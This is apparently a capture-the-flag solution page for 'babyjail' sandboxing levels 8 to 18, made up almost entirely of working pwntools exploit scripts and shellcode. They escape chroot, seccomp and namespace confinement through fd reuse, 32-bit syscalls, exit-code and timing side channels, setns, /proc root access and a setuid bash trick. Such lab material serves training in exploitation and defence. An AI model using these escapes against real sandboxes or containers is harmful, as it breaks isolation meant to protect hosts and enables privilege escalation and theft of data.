+++
title = "Sandboxing"
weight = 0
slug="sandboxing"
description = "Escaping from chroot, seccomp, and namespacing"
+++

# Level 8
You can open file descriptors via the command line?!?!
``` py
from pwn import *
import os

# idea from, https://book.jorianwoltjer.com/binary-exploitation/sandboxes-chroot-seccomp-and-namespaces

def main():
    exe = ELF('/challenge/babyjail_level8')
    context.binary = exe
    context.log_level='debug'
    context.terminal=['tmux', 'splitw', '-v']

    r = process([exe.path, '/'], stderr=os.open('/', os.O_RDONLY))
    #gdb.attach(r, gdbscript='b *main+1177\ndisplay/12i $rip\ndisplay $rax')
    sc = asm('''
        // 2 = openat(2, "flag", O_RDONLY, 0)
        push 0x67616c66
        mov rdi, 2
        mov rsi, rsp
        mov rdx, 0
        mov r10, 0
        mov rax, 257
        syscall

        // buf_len = read(fd, buf, 0x100)
        mov rdi, rax
        lea rsi, [rbp-0x100]
        mov rdx, 0x100
        mov rax, 0
        syscall

        // write(1, buf, buf_len)
        mov rdi, 1
        lea rsi, [rbp-0x100]
        mov rdx, rax
        mov rax, 1
        syscall

        // exit(0)
        mov rax, 60
        mov rdi, 0
        syscall
    ''')
    r.sendline(sc)
    r.interactive()

if __name__ == '__main__':
    main()
```

# Level 9
Conveniently our shellcode get's mmap'd at a 32 bit compatible address, so we can use the 32 bit syscalls

``` py
from pwn import *
import os

def main():
    exe = ELF('/challenge/babyjail_level9')
    context.binary = exe
    context.log_level='debug'
    context.terminal=['tmux', 'splitw', '-v']

    r = process([exe.path])
    #gdb.attach(r, gdbscript='b *main+787\ndisplay/12i $rip\ndisplay $rax')

    # 32 bit syscalls:
    # regs: ebx ecx edx esi edi
    # 3 = read
    # 4 = write
    # 5 = open
    # 6 = close
    sc = asm('''
        // we reuse our shellcode mapping as buf since we need an addr that fits in 4 bytes
        mov r8, rdx

        // fd = open("/flag", O_RDONLY, 0)
        mov rax, 0x67616c662f
        mov [rdx+0x100], rax
        lea rbx, [rdx+0x100]
        mov rcx, 0
        mov rdx, 0
        mov rax, 5
        int 0x80

        // buf_len = read(fd, buf, 0x100)
        mov rbx, rax
        lea rcx, [r8+0x100]
        mov rdx, 0x100
        mov rax, 3
        int 0x80

        // write(1, buf, buf_len)
        mov rbx, 1
        mov rdx, rax
        mov rax, 4
        int 0x80

        // exit(0)
        mov rax, 60
        mov rdi, 0
        syscall
    ''')
    r.sendline(sc)
    r.interactive()


if __name__ == '__main__':
    main()
```

# Level 10
Leak one byte at a time through exit

``` py
from pwn import *
import os

def main():
    exe = ELF('/challenge/babyjail_level10')
    context.binary = exe
    context.log_level='info'
    context.terminal=['tmux', 'splitw', '-v']

    flag = ''
    while '}' not in flag:
        r = process([exe.path, '/flag'])
        #gdb.attach(r, gdbscript='b *main+830\ndisplay/12i $rip\ndisplay $rax')
        sc = asm(f'''
            // read(3, buf, 0x100)
            mov rdi, 3
            mov rsi, rsp
            mov rdx, 0x100
            mov rax, 0
            syscall

            // exit(buf[i])
            movb dil, [rsp+{len(flag)}]
            mov rax, 60
            syscall
        ''')
        r.sendline(sc)
        r.recvall()
        x = r.poll()
        flag += chr(x)
        print(flag)
        r.close()


if __name__ == '__main__':
    main()
```

# Level 11
Leak one bit at a time through timing with nanosleep

``` py
from pwn import *
import time

def main():
    exe = ELF('/challenge/babyjail_level11')
    context.binary = exe
    context.log_level='info'
    context.terminal=['tmux', 'splitw', '-v']

    flag = ''
    byte = ''
    while '}' not in flag:
        r = process([exe.path, '/flag'])
        #gdb.attach(r, gdbscript='b *main+830\ndisplay/12i $rip\ndisplay $rax')
        sc = asm(f'''
            // read(3, buf, 0x100)
            mov rdi, 3
            mov rsi, rsp
            mov rdx, 0x100
            mov rax, 0
            syscall

            // if (buf[flag_len] >> nbits & 1 == 0)
            //    nanosleep(100000000)
            movb dil, [rsp+{len(flag)}]
            shr dil, {len(byte)}
            and dil, 0x1
            cmp dil, 0
            je fail
            movq [rbp-0x20], 0
            movq [rbp-0x18], 0x10000000
            lea rdi, [rbp-0x20]
            mov rsi, 0
            mov rax, 35
            syscall

        fail:
            nop
        ''')
        r.recv()
        x = time.time()
        r.sendline(sc)
        r.poll(block=True)
        x = time.time() - x
        print(x)
        if (x < 0.30):
            byte = '0' + byte
        else:
            byte = '1' + byte
        print('byte =', byte)
        if len(byte) == 8:
            flag += chr(int(byte, 2))
            byte = ''
            print(flag)
        r.close()

if __name__ == '__main__':
    main()
```

# Level 12
Leak one bit at a time through exit code, -SIGSEGV or -SIGSYS
``` py
from pwn import *
import time

def main():
    exe = ELF('/challenge/babyjail_level12')
    context.binary = exe
    context.log_level='info'
    context.terminal=['tmux', 'splitw', '-v']

    flag = ''
    byte = ''
    while '}' not in flag:
        r = process([exe.path, '/flag'])
        #gdb.attach(r, gdbscript='b *main+830\ndisplay/12i $rip\ndisplay $rax')
        sc = asm(f'''
            // read(3, buf, 0x100)
            mov rdi, 3
            mov rsi, rsp
            mov rdx, 0x100
            mov rax, 0
            syscall

            // if (buf[flag_len] >> nbits & 1 == 0)
            //    nanosleep(100000000)
            movb dil, [rsp+{len(flag)}]
            shr dil, {len(byte)}
            and dil, 0x1
            cmp dil, 0
            je fail
            mov rsi, 0
            mov rax, 60
            syscall
        fail:
            nop
        ''')
        r.recv()
        x = time.time()
        r.sendline(sc)
        x = r.poll(block=True)
        print(x)
        if (x == -11):
            byte = '0' + byte
        else:
            byte = '1' + byte
        print('byte =', byte)
        if len(byte) == 8:
            flag += chr(int(byte, 2))
            byte = ''
            print(flag)
        r.close()

if __name__ == '__main__':
    main()
```

# Level 13
Just communicate with parent process correctly

``` py
from pwn import *
import time

def main():
    exe = ELF('/challenge/babyjail_level13')
    context.binary = exe
    context.log_level='info'
    context.terminal=['tmux', 'splitw', '-v']

    r = process([exe.path])
    #r = gdb.debug([exe.path], gdbscript='b *main+474\nb *main+1144\nset follow-fork-mode child\ndisplay/12i $rip\ndisplay $rax')
    sc = asm(f'''
        // write(4, "read_file flag", 14)
        mov rax, 0x6c69665f64616572
        mov [rbp-0x17], rax
        movq [rbp-0xf], 0x6c662065
        movw [rbp-0xb], 0x6761
        movb [rbp-0x9], 0x0
        lea rsi, [rbp-0x17]
        mov rdi, 4
        mov rdx, 14
        mov rax, 1
        syscall

        // nbytes = read(4, buf, 0x100)
        mov rdi, 4
        lea rsi, [rbp-0x100]
        mov rdx, 0x100
        mov rax, 0
        syscall

        // write(4, "print_msg " + buf, nbytes)
        movw [rbp-0x100-2], 0x2067
        mov rax, 0x736d5f746e697270
        movq [rbp-0x100-2-8], rax
        mov rdi, 4
        lea rsi, [rbp-0x100-2-8]
        mov rdx, 0x100
        mov rax, 1
        syscall
    ''')
    r.recv()
    r.sendline(sc)
    r.interactive()

if __name__ == '__main__':
    main()
```

# Level 14
Host filesystem not unmounted, accessible through "/old".

From in the sandbox:
```
cat /old/flag
```

# Level 15
Changes from the sandbox persist to the host filesystem.

From in the sandbox:
```
chmod +s /bin/bash
```

From outside the sandbox:
```
/bin/bash -pc 'cat /flag'
```

# Level 16
Host filesystem accessible through "/proc"

From in the sandbox:
```
cat /proc/1/root/flag
```

# Level 17
Sandbox takes an argument to open, so we can open "/" before being sandboxed, then do openat stuff

``` py
from pwn import *
import time

def main():
    exe = ELF('/challenge/babyjail_level17')
    context.binary = exe
    context.log_level='debug'
    context.terminal=['tmux', 'splitw', '-v']

    r = process([exe.path, '/'])
    #r = gdb.debug([exe.path], gdbscript='b *main+474\nb *main+1144\nset follow-fork-mode child\ndisplay/12i $rip\ndisplay $rax')
    sc = asm(f'''
        // openat(3, "flag", 0, 0)
        push 0x67616c66
        mov rdi, 3
        mov rsi, rsp
        mov rdx, 0
        mov r10, 0
        mov rax, 257
        syscall

        // nbytes = read(4, buf, 0x100)
        mov rdi, 4
        lea rsi, [rbp-0x100]
        mov rdx, 0x100
        mov rax, 0
        syscall

        // write(1, buf, nbytes)
        mov rdi, 1
        lea rsi, [rbp-0x100]
        mov rdx, rax
        mov rax, 1
        syscall

        mov rdi, 0
        mov rax, 60
    ''')
    r.recv()
    r.sendline(sc)
    r.interactive()

if __name__ == '__main__':
    main()
```

# Level 18
The sandbox can mount "/proc/1/ns" and then use the setns syscall to escape

``` py
from pwn import *
import time

def main():
    exe = ELF('/challenge/babyjail_level18')
    context.binary = exe
    context.log_level='debug'
    context.terminal=['tmux', 'splitw', '-v']

    r = process([exe.path, '/proc/1/ns'])
    #r = gdb.debug([exe.path, '/proc/1/ns'], gdbscript='b *main+3082\ndisplay/6i $rip\ndisplay $rax')
    sc = asm(f'''
        // fd = open("/data/mnt", O_RDONLY, 0)
        mov rax,0x6e6d2f617461642f
        mov [rbp-0xe], rax
        movw [rbp-0x6], 0x74
        mov rdx, 0
        mov rsi, 0
        lea rdi, [rbp-0xe]
        mov rax, 2
        syscall
        // setns(fd, CLONE_NEWNS)
        mov rsi, 0x20000
        mov rdi, rax
        mov rax, 308
        syscall
    ''')
    r.recv()
    r.sendline(sc + asm(shellcraft.cat("/flag")))
    r.interactive()

if __name__ == '__main__':
    main()
```
